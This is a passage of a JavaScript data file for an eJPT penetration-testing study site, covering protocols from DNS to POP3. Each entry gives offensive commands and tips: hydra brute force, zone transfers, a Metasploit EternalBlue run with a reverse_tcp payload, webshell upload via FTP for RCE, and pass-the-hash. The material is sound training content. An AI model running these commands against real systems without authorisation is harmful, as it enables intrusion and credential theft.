+      { label: 'DNS Enumeration with dnsenum', code: `<span class="code-cmd">dnsenum</span> <span class="code-flag">--dnsserver</span> <span class="code-target">8.8.8.8</span> <span class="code-target">target.com</span>
+<span class="code-cmd">fierce</span> <span class="code-flag">--domain</span> <span class="code-target">target.com</span>
+<span class="code-cmd">dnsrecon</span> <span class="code-flag">-d</span> <span class="code-target">target.com</span> <span class="code-flag">-t</span> axfr` },
+      { label: 'Nmap DNS scripts', code: `<span class="code-cmd">nmap</span> <span class="code-flag">--script dns-brute</span> <span class="code-target">target.com</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 53 --script dns-zone-transfer</span> <span class="code-target">[target]</span>` },
+    ],
+    attacks: [
+      {name:'Zone Transfer (AXFR)',desc:'Dumps all DNS records if misconfigured',impact:'High',tools:['dig','dnsrecon','dnsenum']},
+      {name:'DNS Brute Force',desc:'Enumerate subdomains using wordlists',impact:'Med',tools:['fierce','gobuster dns','dnsenum']},
+      {name:'DNS Cache Poisoning',desc:'Insert malicious records into DNS cache',impact:'High',tools:['Custom exploit']},
+      {name:'DNS Tunneling',desc:'Exfiltrate data inside DNS queries',impact:'Med',tools:['dnscat2','iodine']},
+      {name:'Subdomain Enumeration',desc:'Find hidden subdomains (dev, admin, internal)',impact:'Med',tools:['subfinder','amass','dnsrecon']},
+    ],
+    examTip: 'DNS zone transfer (AXFR) is the #1 DNS attack in eJPT. Always test: dig axfr @[nameserver] [domain]. If it returns records, you hit gold — internal hosts, dev servers, and more may be revealed.',
+    fieldTip: 'In real engagements, DNS recon can reveal internal network architecture — internal.corp.com, dev.corp.com, vpn.corp.com, etc. Always enumerate DNS before anything else in external assessments.',
+    risks: [{label:'Zone Transfer',class:'risk-high',val:90},{label:'Cache Poison',class:'risk-high',val:80},{label:'Brute Force',class:'risk-med',val:55}]
+  },
+
+  {
+    id: 'p-ftp', num: '02', name: 'FTP', full: 'File Transfer Protocol',
+    port: '21 (ctrl), 20 (data)', transport: 'tcp', layer: 'l7', categories: ['file','high'],
+    risk: 'high', icon: '📁', iconBg: 'rgba(224,85,85,0.12)',
+    shortDesc: 'Transfers files between hosts. Cleartext credentials. Supports anonymous login.',
+    structure: `FTP uses TWO connections — a Control Channel (port 21) for commands and a Data Channel (port 20 for active, ephemeral for passive) for actual file transfer. Authentication is done in PLAINTEXT.`,
+    packetFields: [
+      {name:'Channel', val:'Control', key:false},
+      {name:'Port', val:'21', key:true},
+      {name:'Auth', val:'CLEARTEXT', key:true},
+      {name:'Data Port', val:'20 (active)', key:false},
+      {name:'Mode', val:'Active/Passive', key:true},
+      {name:'Encryption', val:'NONE', key:false},
+    ],
+    howItWorks: ['Client connects to port 21 (control channel)','Server sends 220 banner','Client sends USER then PASS (in CLEARTEXT)','For file transfer — Active: server connects back to client:20 / Passive: client connects to server on ephemeral port','Commands: LIST, RETR, STOR, DELE, PWD, CWD','Session ends with QUIT'],
+    commands: [
+      { label: 'Manual FTP connection', code: `<span class="code-cmd">ftp</span> <span class="code-target">[target_ip]</span>
+<span class="code-comment"># Try anonymous login</span>
+Username: <span class="code-highlight">anonymous</span>
+Password: <span class="code-highlight">anonymous@</span>   <span class="code-comment"># or blank</span>
+ftp> <span class="code-cmd">ls</span>
+ftp> <span class="code-cmd">get</span> <span class="code-target">secret.txt</span>
+ftp> <span class="code-cmd">put</span> <span class="code-target">shell.php</span>
+ftp> <span class="code-cmd">bye</span>` },
+      { label: 'Nmap FTP scripts', code: `<span class="code-cmd">nmap</span> <span class="code-flag">-p 21 --script ftp-anon</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 21 --script ftp-brute</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 21 --script ftp-syst</span> <span class="code-target">[target]</span>` },
+      { label: 'Hydra FTP brute force', code: `<span class="code-cmd">hydra</span> <span class="code-flag">-l</span> admin <span class="code-flag">-P</span> <span class="code-target">/usr/share/wordlists/rockyou.txt</span> <span class="code-target">[target]</span> ftp
+<span class="code-cmd">hydra</span> <span class="code-flag">-L</span> users.txt <span class="code-flag">-P</span> pass.txt <span class="code-flag">-t 4</span> <span class="code-target">[target]</span> ftp` },
+      { label: 'Capture FTP creds with Wireshark', code: `<span class="code-comment"># Display filter in Wireshark:</span>
+<span class="code-highlight">ftp</span>
+<span class="code-comment"># Look for packets with:</span>
+<span class="code-highlight">USER</span> <span class="code-target">admin</span>
+<span class="code-highlight">PASS</span> <span class="code-target">password123</span>   <span class="code-comment"># Fully visible!</span>` },
+    ],
+    attacks: [
+      {name:'Anonymous Login',desc:'Login with user "anonymous" and blank password',impact:'High',tools:['ftp','nmap ftp-anon']},
+      {name:'Brute Force',desc:'Dictionary attack on FTP credentials',impact:'High',tools:['hydra','medusa','nmap ftp-brute']},
+      {name:'Credential Sniffing',desc:'Capture cleartext USER/PASS from network traffic',impact:'Critical',tools:['wireshark','tcpdump']},
+      {name:'vsftpd 2.3.4 Backdoor',desc:'Smiley-face backdoor opens root shell on port 6200',impact:'Critical',tools:['metasploit','nc']},
+      {name:'FTP Bounce Attack',desc:'Use FTP server as proxy to scan internal hosts',impact:'Med',tools:['nmap -b']},
+    ],
+    examTip: 'vsftpd 2.3.4 on Metasploitable = instant root shell (exploit/unix/ftp/vsftpd_234_backdoor). Also always check ftp-anon — anonymous login = free file access. FTP is one of the most exploited services on eJPT.',
+    fieldTip: 'FTP still exists in legacy systems, IoT devices, and file servers. Always check if it accepts anonymous. Always try to upload a PHP webshell to the FTP root, then access it via HTTP for RCE.',
+    risks: [{label:'Anon Login',class:'risk-high',val:85},{label:'Cred Sniff',class:'risk-high',val:95},{label:'Brute Force',class:'risk-high',val:80}]
+  },
+
+  {
+    id: 'p-ssh', num: '03', name: 'SSH', full: 'Secure Shell Protocol',
+    port: '22', transport: 'tcp', layer: 'l7', categories: ['remote'],
+    risk: 'med', icon: '🔒', iconBg: 'rgba(74,180,90,0.12)',
+    shortDesc: 'Encrypted remote shell access. Replaced Telnet. Still vulnerable to brute force and weak keys.',
+    structure: `SSH establishes an encrypted tunnel using asymmetric key exchange (Diffie-Hellman), then authenticates via password or public key. All traffic is encrypted unlike Telnet.`,
+    packetFields: [
+      {name:'Version', val:'SSH-2.0', key:false},
+      {name:'Port', val:'22', key:true},
+      {name:'Auth', val:'Password/Key', key:true},
+      {name:'Encryption', val:'AES-256', key:false},
+      {name:'Key Exchange', val:'DH/ECDH', key:false},
+      {name:'HMAC', val:'SHA2-256', key:false},
+    ],
+    howItWorks: ['Client connects to port 22','Server presents its host key (fingerprint)','Key exchange (Diffie-Hellman) negotiates session key','Client authenticates: password OR public key','Encrypted session begins','All further communication is ciphertext'],
+    commands: [
+      { label: 'Connect to SSH', code: `<span class="code-cmd">ssh</span> <span class="code-target">user@target_ip</span>
+<span class="code-cmd">ssh</span> <span class="code-flag">-p 2222</span> <span class="code-target">user@target_ip</span>   <span class="code-comment"># custom port</span>
+<span class="code-cmd">ssh</span> <span class="code-flag">-i</span> <span class="code-target">private_key.pem</span> <span class="code-target">user@target_ip</span>` },
+      { label: 'SSH Enumeration with nmap', code: `<span class="code-cmd">nmap</span> <span class="code-flag">-p 22 --script ssh2-enum-algos</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 22 --script ssh-hostkey</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 22 --script ssh-auth-methods</span> <span class="code-flag">--script-args</span> <span class="code-target">ssh.user=root</span> <span class="code-target">[target]</span>` },
+      { label: 'Brute force with Hydra', code: `<span class="code-cmd">hydra</span> <span class="code-flag">-l</span> root <span class="code-flag">-P</span> <span class="code-target">rockyou.txt</span> <span class="code-target">[target]</span> ssh
+<span class="code-cmd">hydra</span> <span class="code-flag">-L</span> users.txt <span class="code-flag">-P</span> pass.txt <span class="code-flag">-t 4 -s 22</span> <span class="code-target">[target]</span> ssh` },
+      { label: 'SSH tunneling (pivoting)', code: `<span class="code-comment"># Local port forward — reach internal service</span>
+<span class="code-cmd">ssh</span> <span class="code-flag">-L</span> 8080:internal_host:80 <span class="code-target">user@pivot_host</span>
+
+<span class="code-comment"># Dynamic SOCKS proxy</span>
+<span class="code-cmd">ssh</span> <span class="code-flag">-D 1080</span> <span class="code-target">user@pivot_host</span>
+<span class="code-comment"># Then: proxychains nmap [internal_range]</span>` },
+    ],
+    attacks: [
+      {name:'Brute Force',desc:'Dictionary attack on SSH credentials',impact:'High',tools:['hydra','medusa','ncrack']},
+      {name:'Username Enumeration',desc:'Timing attack to determine valid usernames (OpenSSH < 7.7)',impact:'Med',tools:['ssh-enum-users','metasploit']},
+      {name:'Weak Key Attack',desc:'Small RSA keys or reused keys can be factored',impact:'High',tools:['msf','custom']},
+      {name:'Known Exploit',desc:'CVE-2023-38408 / older OpenSSH vulnerabilities',impact:'High',tools:['metasploit']},
+    ],
+    examTip: 'SSH is usually the entry point after cracking credentials elsewhere. Find a password via FTP/SMB/web, then pivot to SSH. Also know SSH tunneling — eJPT may ask you to reach an internal service via SSH port forwarding.',
+    fieldTip: 'In real pentests, SSH with default credentials on IoT/embedded devices is extremely common. Also: find id_rsa private keys in exposed directories (git repos, backups, FTP) and use them for passwordless SSH.',
+    risks: [{label:'Brute Force',class:'risk-high',val:75},{label:'Weak Keys',class:'risk-med',val:50},{label:'Tunneling',class:'risk-low',val:30}]
+  },
+
+  {
+    id: 'p-telnet', num: '04', name: 'Telnet', full: 'Teletype Network Protocol',
+    port: '23', transport: 'tcp', layer: 'l7', categories: ['remote','high'],
+    risk: 'high', icon: '⚠️', iconBg: 'rgba(224,85,85,0.12)',
+    shortDesc: 'Legacy cleartext remote shell. Completely insecure. Still found on network gear and embedded devices.',
+    structure: `Telnet sends ALL data including usernames, passwords, and commands in plaintext. No encryption, no integrity checking. Any packet sniffer on the network can read the entire session.`,
+    packetFields: [
+      {name:'Port', val:'23', key:true},
+      {name:'Auth', val:'CLEARTEXT', key:true},
+      {name:'Commands', val:'CLEARTEXT', key:true},
+      {name:'Encryption', val:'NONE', key:false},
+      {name:'Integrity', val:'NONE', key:false},
+      {name:'Target', val:'Routers/IoT', key:false},
+    ],
+    howItWorks: ['Client connects to port 23','Server presents login prompt in PLAINTEXT','User types username and password — BOTH visible on wire','Shell session begins — every keypress transmitted in cleartext','Attacker on network sees everything in Wireshark'],
+    commands: [
+      { label: 'Connect to Telnet service', code: `<span class="code-cmd">telnet</span> <span class="code-target">[target_ip]</span>
+<span class="code-cmd">telnet</span> <span class="code-target">[target_ip]</span> <span class="code-flag">23</span>
+<span class="code-comment"># Also used for banner grabbing on any port</span>
+<span class="code-cmd">telnet</span> <span class="code-target">[target_ip]</span> <span class="code-flag">80</span>   <span class="code-comment"># HTTP banner</span>
+<span class="code-cmd">telnet</span> <span class="code-target">[target_ip]</span> <span class="code-flag">25</span>   <span class="code-comment"># SMTP banner</span>` },
+      { label: 'Sniff Telnet credentials', code: `<span class="code-comment"># Wireshark filter:</span>
+<span class="code-highlight">telnet</span>
+<span class="code-comment"># Or follow TCP stream → see full session in cleartext
+# tcpdump one-liner:</span>
+<span class="code-cmd">tcpdump</span> <span class="code-flag">-i eth0 -A port 23</span>` },
+      { label: 'Brute force Telnet', code: `<span class="code-cmd">hydra</span> <span class="code-flag">-l</span> admin <span class="code-flag">-P</span> <span class="code-target">rockyou.txt</span> <span class="code-target">[target]</span> telnet
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 23 --script telnet-ntlm-info</span> <span class="code-target">[target]</span>` },
+    ],
+    attacks: [
+      {name:'Credential Sniffing',desc:'All auth is cleartext — instant credential harvest',impact:'Critical',tools:['wireshark','tcpdump']},
+      {name:'MITM Session Hijacking',desc:'Inject commands into active Telnet session',impact:'Critical',tools:['ettercap','arpspoof']},
+      {name:'Brute Force',desc:'Dictionary attack on Telnet login',impact:'High',tools:['hydra','medusa']},
+    ],
+    examTip: 'If nmap finds Telnet open, immediately check for default credentials (admin/admin, admin/password, root/root). Also sniff traffic in lab environments — Telnet creds appear in cleartext in Wireshark.',
+    fieldTip: 'Telnet survives in: Cisco/Juniper routers, old Cisco switches, IoT sensors, SCADA systems, old embedded Linux boxes. "show run" in a Cisco Telnet session = entire device configuration.',
+    risks: [{label:'Cred Sniff',class:'risk-high',val:100},{label:'Session Hijack',class:'risk-high',val:90},{label:'Brute Force',class:'risk-high',val:80}]
+  },
+
+  {
+    id: 'p-http', num: '05', name: 'HTTP', full: 'Hypertext Transfer Protocol',
+    port: '80', transport: 'tcp', layer: 'l7', categories: ['infra'],
+    risk: 'med', icon: '🌍', iconBg: 'rgba(224,144,48,0.12)',
+    shortDesc: 'The foundation of the web. Request/response protocol. Cleartext. Base for all web attacks.',
+    structure: `HTTP is a stateless request/response protocol. Client sends METHOD + PATH + headers + optional body. Server responds with status code + headers + body. No encryption (use HTTPS for that).`,
+    packetFields: [
+      {name:'Method', val:'GET/POST', key:true},
+      {name:'Path', val:'/login.php', key:true},
+      {name:'Host', val:'target.com', key:false},
+      {name:'Status', val:'200/403/500', key:true},
+      {name:'Body', val:'HTML/JSON', key:false},
+      {name:'Cookie', val:'Session ID', key:true},
+    ],
+    howItWorks: ['Client sends: GET /path HTTP/1.1 + Host header','Server processes request','Server returns status code (200 OK, 404 Not Found, etc.)','Response body contains HTML/JSON/etc.','Cookies establish stateful sessions on top of stateless HTTP','HTTPS = HTTP + TLS encryption layer'],
+    commands: [
+      { label: 'Manual HTTP requests with curl', code: `<span class="code-cmd">curl</span> <span class="code-flag">-v</span> <span class="code-target">http://target.com</span>
+<span class="code-cmd">curl</span> <span class="code-flag">-I</span> <span class="code-target">http://target.com</span>   <span class="code-comment"># headers only</span>
+<span class="code-cmd">curl</span> <span class="code-flag">-X POST -d "user=admin&pass=test"</span> <span class="code-target">http://target/login</span>
+<span class="code-cmd">curl</span> <span class="code-flag">-H "Cookie: PHPSESSID=abc123"</span> <span class="code-target">http://target/admin</span>` },
+      { label: 'Directory enumeration', code: `<span class="code-cmd">gobuster</span> dir <span class="code-flag">-u</span> <span class="code-target">http://target</span> <span class="code-flag">-w</span> <span class="code-target">/usr/share/wordlists/dirb/common.txt</span>
+<span class="code-cmd">gobuster</span> dir <span class="code-flag">-u</span> <span class="code-target">http://target</span> <span class="code-flag">-w</span> common.txt <span class="code-flag">-x php,html,txt,bak</span>
+<span class="code-cmd">dirb</span> <span class="code-target">http://target</span> <span class="code-target">/usr/share/wordlists/dirb/big.txt</span>` },
+      { label: 'Nikto web vulnerability scan', code: `<span class="code-cmd">nikto</span> <span class="code-flag">-h</span> <span class="code-target">http://target</span>
+<span class="code-cmd">nikto</span> <span class="code-flag">-h</span> <span class="code-target">http://target</span> <span class="code-flag">-output</span> nikto_report.txt
+<span class="code-cmd">whatweb</span> <span class="code-target">http://target</span>   <span class="code-comment"># tech fingerprint</span>` },
+    ],
+    attacks: [
+      {name:'Directory Traversal',desc:'../../../etc/passwd style path manipulation',impact:'High',tools:['burpsuite','gobuster']},
+      {name:'SQL Injection',desc:"' OR 1=1-- - in parameters",impact:'Critical',tools:['sqlmap','burpsuite']},
+      {name:'XSS',desc:'Inject JavaScript into page reflected to users',impact:'High',tools:['burpsuite','xsstrike']},
+      {name:'File Upload RCE',desc:'Upload PHP webshell, execute commands',impact:'Critical',tools:['burpsuite','weevely']},
+      {name:'IDOR',desc:'Change user_id=1 to user_id=2 for unauthorized access',impact:'High',tools:['burpsuite']},
+    ],
+    examTip: 'HTTP is the backbone of web pentesting in eJPT Unit 4. Master: directory busting with gobuster, Burp Suite proxy intercept, and recognizing SQLi/XSS/LFI entry points. robots.txt and /phpmyadmin are always worth checking.',
+    fieldTip: 'Check: HTTP response headers (Server, X-Powered-By), robots.txt, /sitemap.xml, page source comments, and JavaScript files for hardcoded API keys and endpoints.',
+    risks: [{label:'SQLi',class:'risk-high',val:95},{label:'XSS',class:'risk-high',val:85},{label:'Dir Traversal',class:'risk-high',val:80}]
+  },
+
+  {
+    id: 'p-https', num: '06', name: 'HTTPS', full: 'HTTP Secure (HTTP over TLS)',
+    port: '443', transport: 'tcp', layer: 'l7', categories: ['infra'],
+    risk: 'low', icon: '🔐', iconBg: 'rgba(74,180,90,0.12)',
+    shortDesc: 'HTTP encrypted with TLS. Protects data in transit but the application layer can still be vulnerable.',
+    structure: `HTTPS wraps HTTP in a TLS (Transport Layer Security) tunnel. The TLS handshake establishes encryption keys, then HTTP flows inside. The encryption protects the data in transit but NOT the application logic.`,
+    packetFields: [
+      {name:'Port', val:'443', key:true},
+      {name:'TLS Ver', val:'1.2 / 1.3', key:false},
+      {name:'Cipher', val:'AES-256-GCM', key:false},
+      {name:'Cert', val:'X.509', key:true},
+      {name:'HTTP', val:'Inside TLS', key:false},
+      {name:'HSTS', val:'Optional', key:false},
+    ],
+    howItWorks: ['Client connects to port 443','TLS handshake: ClientHello → ServerHello + Certificate','Client verifies certificate against trusted CA','Session keys derived from key exchange','HTTP traffic flows inside the encrypted tunnel','All data is opaque to network interceptors'],
+    commands: [
+      { label: 'Enumerate HTTPS with nmap', code: `<span class="code-cmd">nmap</span> <span class="code-flag">-p 443 --script ssl-enum-ciphers</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 443 --script ssl-cert</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 443 --script ssl-heartbleed</span> <span class="code-target">[target]</span>` },
+      { label: 'SSL/TLS analysis', code: `<span class="code-cmd">sslscan</span> <span class="code-target">target.com</span>
+<span class="code-cmd">sslyze</span> <span class="code-target">target.com</span>
+<span class="code-comment"># Look for: SSLv3, TLS 1.0/1.1, weak ciphers, expired cert</span>` },
+      { label: 'Burp Suite intercepts HTTPS', code: `<span class="code-comment"># Setup:</span>
+<span class="code-highlight">1.</span> Install Burp CA cert in Firefox
+<span class="code-highlight">2.</span> Set proxy: 127.0.0.1:8080 in FoxyProxy
+<span class="code-highlight">3.</span> Burp decrypts, inspects, re-encrypts TLS
+<span class="code-comment"># Now you see plaintext inside HTTPS!</span>` },
+    ],
+    attacks: [
+      {name:'Heartbleed (CVE-2014-0160)',desc:'Read 64KB server memory — leaks keys, sessions',impact:'Critical',tools:['nmap ssl-heartbleed','msf']},
+      {name:'POODLE / BEAST',desc:'Exploit SSLv3 / TLS 1.0 weaknesses',impact:'High',tools:['sslscan','testssl']},
+      {name:'SSL Stripping',desc:'Downgrade HTTPS to HTTP via MITM',impact:'High',tools:['sslstrip','mitmproxy']},
+      {name:'Weak Cipher Suites',desc:'Null ciphers, export-grade crypto — decrypt traffic',impact:'High',tools:['sslscan','sslyze']},
+      {name:'Certificate Forgery',desc:'Self-signed certs in MITM attacks',impact:'High',tools:['mitmproxy','burpsuite']},
+    ],
+    examTip: 'HTTPS ≠ secure application. All web vulnerabilities (SQLi, XSS, LFI, etc.) work just as well over HTTPS. Use Burp Suite to decrypt and inspect. Also check for Heartbleed on older servers.',
+    fieldTip: 'During recon: check certificate Subject Alternative Names (SANs) — they often reveal additional domain names and internal hostnames. Also: expired certs, self-signed certs = flag for client report.',
+    risks: [{label:'Heartbleed',class:'risk-high',val:90},{label:'SSL Strip',class:'risk-med',val:65},{label:'App Vulns',class:'risk-high',val:95}]
+  },
+
+  {
+    id: 'p-smb', num: '07', name: 'SMB', full: 'Server Message Block',
+    port: '445 (139 legacy)', transport: 'tcp', layer: 'l7', categories: ['file','high'],
+    risk: 'high', icon: '📂', iconBg: 'rgba(224,85,85,0.12)',
+    shortDesc: 'Windows file sharing protocol. Historically the most exploited protocol. EternalBlue, WannaCry, NotPetya all use SMB.',
+    structure: `SMB operates over TCP port 445. It provides file sharing, printer sharing, and Windows authentication. SMB v1 (SMBv1) is severely vulnerable — MS17-010/EternalBlue. SMBv2/v3 are safer but misconfigs still get exploited.`,
+    packetFields: [
+      {name:'Port', val:'445 / 139', key:true},
+      {name:'Version', val:'v1/v2/v3', key:true},
+      {name:'Auth', val:'NTLM/Kerberos', key:true},
+      {name:'Shares', val:'C$, ADMIN$', key:false},
+      {name:'Guest', val:'Sometimes', key:false},
+      {name:'Signing', val:'Optional', key:false},
+    ],
+    howItWorks: ['Client connects to port 445','Negotiate protocol version and dialect','Authenticate via NTLM or Kerberos','Access shares: \\\\server\\share\\','Read/write/execute files on shares','ADMIN$ and C$ = administrative shares (need admin)'],
+    commands: [
+      { label: 'SMB Enumeration — enum4linux', code: `<span class="code-cmd">enum4linux</span> <span class="code-flag">-a</span> <span class="code-target">[target]</span>
+<span class="code-comment"># Enumerates: users, shares, groups, policies, OS info</span>
+<span class="code-cmd">enum4linux</span> <span class="code-flag">-u</span> admin <span class="code-flag">-p</span> password <span class="code-flag">-a</span> <span class="code-target">[target]</span>` },
+      { label: 'smbclient — manual share access', code: `<span class="code-cmd">smbclient</span> <span class="code-flag">-L</span> //<span class="code-target">[target]</span>/ <span class="code-flag">-N</span>   <span class="code-comment"># list shares, no password</span>
+<span class="code-cmd">smbclient</span> //<span class="code-target">[target]</span>/tmp <span class="code-flag">-N</span>    <span class="code-comment"># connect to share</span>
+<span class="code-cmd">smbclient</span> //<span class="code-target">[target]</span>/C$ <span class="code-flag">-U</span> admin
+smb: \> <span class="code-cmd">ls</span>
+smb: \> <span class="code-cmd">get</span> <span class="code-target">secret.txt</span>` },
+      { label: 'smbmap — share permission check', code: `<span class="code-cmd">smbmap</span> <span class="code-flag">-H</span> <span class="code-target">[target]</span>
+<span class="code-cmd">smbmap</span> <span class="code-flag">-H</span> <span class="code-target">[target]</span> <span class="code-flag">-u</span> admin <span class="code-flag">-p</span> password
+<span class="code-cmd">smbmap</span> <span class="code-flag">-H</span> <span class="code-target">[target]</span> <span class="code-flag">-R</span>  <span class="code-comment"># recursive listing</span>` },
+      { label: 'Nmap SMB scripts', code: `<span class="code-cmd">nmap</span> <span class="code-flag">-p 445 --script smb-enum-shares,smb-enum-users</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 445 --script smb-vuln-ms17-010</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 445 --script smb-security-mode</span> <span class="code-target">[target]</span>` },
+      { label: 'Metasploit EternalBlue (MS17-010)', code: `<span class="code-cmd">use</span> exploit/windows/smb/ms17_010_eternalblue
+<span class="code-cmd">set</span> RHOSTS <span class="code-target">[target]</span>
+<span class="code-cmd">set</span> LHOST <span class="code-target">[your_ip]</span>
+<span class="code-cmd">set</span> payload windows/x64/meterpreter/reverse_tcp
+<span class="code-cmd">run</span>
+<span class="code-comment"># Result: SYSTEM shell on unpatched Windows</span>` },
+    ],
+    attacks: [
+      {name:'EternalBlue (MS17-010)',desc:'SMBv1 buffer overflow → SYSTEM shell, no auth needed',impact:'Critical',tools:['metasploit','EternalBlue.py']},
+      {name:'Null Session',desc:'Anonymous access to shares — no credentials needed',impact:'High',tools:['enum4linux','smbclient -N']},
+      {name:'Pass the Hash',desc:'Use NTLM hash directly without cracking to auth',impact:'Critical',tools:['pth-winexe','crackmapexec']},
+      {name:'SMB Relay',desc:'Relay NTLM auth to other SMB hosts for lateral movement',impact:'Critical',tools:['responder','ntlmrelayx']},
+      {name:'Brute Force',desc:'Dictionary attack on SMB credentials',impact:'High',tools:['hydra','crackmapexec','msf']},
+    ],
+    examTip: 'SMB is critical for eJPT. Know: enum4linux for enumeration, EternalBlue for unpatched Windows, Samba usermap_script for Linux Samba. The Metasploitable Samba exploit (CVE-2007-2447) gives instant root shell.',
+    fieldTip: 'In real engagements: Responder on internal networks captures NTLM hashes automatically. SMB signing disabled = relay attacks possible. Check for writable shares — upload and execute files.',
+    risks: [{label:'EternalBlue',class:'risk-high',val:100},{label:'Pass-the-Hash',class:'risk-high',val:90},{label:'Null Session',class:'risk-high',val:75}]
+  },
+
+  {
+    id: 'p-smtp', num: '08', name: 'SMTP', full: 'Simple Mail Transfer Protocol',
+    port: '25, 465 (SSL), 587 (STARTTLS)', transport: 'tcp', layer: 'l7', categories: ['email'],
+    risk: 'med', icon: '📧', iconBg: 'rgba(224,144,48,0.12)',
+    shortDesc: 'Sends email between mail servers. Username enumeration, open relay, and phishing pivots.',
+    structure: `SMTP uses a command/response model. The sending client connects to port 25, issues EHLO, then commands to send mail. Port 25 is server-to-server. Port 587 is client submission.`,
+    packetFields: [
+      {name:'Port', val:'25/587/465', key:true},
+      {name:'EHLO', val:'Domain', key:false},
+      {name:'MAIL FROM', val:'Sender', key:false},
+      {name:'RCPT TO', val:'Recipient', key:true},
+      {name:'DATA', val:'Message body', key:false},
+      {name:'Auth', val:'Optional', key:false},
+    ],
+    howItWorks: ['Client connects, server sends 220 banner','Client: EHLO client.domain.com','Server: lists supported extensions (AUTH, STARTTLS)','MAIL FROM: <sender@domain.com>','RCPT TO: <recipient@domain.com>','DATA → message body → single dot "." to end','QUIT'],
+    commands: [
+      { label: 'Manual SMTP interaction + user enum', code: `<span class="code-cmd">nc</span> <span class="code-target">[target]</span> 25
+<span class="code-comment"># VRFY command enumerates users:</span>
+<span class="code-highlight">VRFY</span> <span class="code-target">root</span>
+<span class="code-output">252 root@mailserver (valid)</span>
+<span class="code-highlight">VRFY</span> <span class="code-target">nobody</span>
+<span class="code-output">550 nobody... User unknown</span>
+<span class="code-comment"># EXPN command expands mailing lists:</span>
+<span class="code-highlight">EXPN</span> <span class="code-target">admin</span>` },
+      { label: 'Nmap SMTP scripts', code: `<span class="code-cmd">nmap</span> <span class="code-flag">-p 25 --script smtp-commands</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 25 --script smtp-enum-users</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 25 --script smtp-open-relay</span> <span class="code-target">[target]</span>` },
+      { label: 'Metasploit SMTP user enumeration', code: `<span class="code-cmd">use</span> auxiliary/scanner/smtp/smtp_enum
+<span class="code-cmd">set</span> RHOSTS <span class="code-target">[target]</span>
+<span class="code-cmd">set</span> USER_FILE <span class="code-target">/usr/share/wordlists/metasploit/unix_users.txt</span>
+<span class="code-cmd">run</span>` },
+    ],
+    attacks: [
+      {name:'User Enumeration',desc:'VRFY/EXPN/RCPT commands reveal valid usernames',impact:'Med',tools:['smtp-user-enum','nmap','msf']},
+      {name:'Open Relay',desc:'Relay spam through misconfigured server',impact:'High',tools:['nmap smtp-open-relay']},
+      {name:'Header Injection',desc:'Inject CC/BCC via crafted form inputs for spam',impact:'Med',tools:['manual','burpsuite']},
+      {name:'STARTTLS Downgrade',desc:'Strip TLS to read email in cleartext',impact:'High',tools:['custom','mitmproxy']},
+    ],
+    examTip: 'SMTP user enumeration with VRFY is testable. Use: smtp-user-enum -M VRFY -U users.txt -t [target]. Valid users found via SMTP can be used for password spraying on other services.',
+    fieldTip: 'Port 25 open externally with open relay = immediate critical finding. Always test RCPT TO enumeration even if VRFY is disabled — it is harder to block.',
+    risks: [{label:'User Enum',class:'risk-med',val:65},{label:'Open Relay',class:'risk-high',val:80},{label:'Phishing Base',class:'risk-high',val:85}]
+  },
+
+  {
+    id: 'p-pop3', num: '09', name: 'POP3', full: 'Post Office Protocol v3',
+    port: '110 (plain), 995 (SSL)', transport: 'tcp', layer: 'l7', categories: ['email'],
+    risk: 'med', icon: '📬', iconBg: 'rgba(224,144,48,0.12)',
+    shortDesc: 'Downloads emails from server to client. Cleartext by default on port 110. Credentials exposed.',
+    structure: `POP3 downloads emails from the server and (by default) deletes them. Client authenticates, retrieves mail, optionally deletes. Simple 3-state machine: AUTHORIZATION → TRANSACTION → UPDATE.`,
+    packetFields: [
+      {name:'Port', val:'110/995', key:true},
+      {name:'Auth', val:'USER/PASS', key:true},
+      {name:'Encryption', val:'None/TLS', key:false},
+      {name:'RETR', val:'Fetch mail', key:false},
+      {name:'DELE', val:'Delete mail', key:false},
+      {name:'Statefulness', val:'Session', key:false},
+    ],
+    howItWorks: ['Client connects to port 110','Server: +OK POP3 server ready','USER username → PASS password (cleartext!)','STAT → count of messages and sizes','RETR 1 → retrieve message #1','DELE 1 → mark for deletion','QUIT → deleted messages removed'],
+    commands: [
+      { label: 'Manual POP3 session', code: `<span class="code-cmd">nc</span> <span class="code-target">[target]</span> 110
+<span class="code-output">+OK POP3 server ready</span>
+<span class="code-highlight">USER</span> <span class="code-target">admin</span>
+<span class="code-output">+OK send PASS</span>
+<span class="code-highlight">PASS</span> <span class="code-target">password</span>
+<span class="code-output">+OK Logged in</span>
+<span class="code-highlight">LIST</span>
+<span class="code-highlight">RETR 1</span>
+<span class="code-highlight">QUIT</span>` },
+      { label: 'Nmap & Hydra', code: `<span class="code-cmd">nmap</span> <span class="code-flag">-p 110 --script pop3-capabilities</span> <span class="code-target">[target]</span>
+<span class="code-cmd">hydra</span> <span class="code-flag">-l</span> admin <span class="code-flag">-P</span> rockyou.txt <span class="code-target">[target]</span> pop3` },
+    ],
+    attacks: [
+      {name:'Credential Sniffing',desc:'USER/PASS sent in cleartext on port 110',impact:'Critical',tools:['wireshark','tcpdump']},
+      {name:'Brute Force',desc:'Dictionary attack on POP3 login',impact:'High',tools:['hydra','ncrack']},
+      {name:'Email Harvesting',desc:'Read all emails after login for sensitive info',impact:'High',tools:['nc','openssl s_client']},
+    ],
+    examTip: 'POP3 on port 110 = cleartext credentials. Just like Telnet — if you can sniff the network, you can capture email logins. Use Hydra to brute force if you have a username list from SMTP enumeration.',
+    fieldTip: 'POP3S on 995 is encrypted, but verify the cert. Legacy POP3 on port 110 in enterprise networks is a compliance failure and should be noted in pentest reports.',
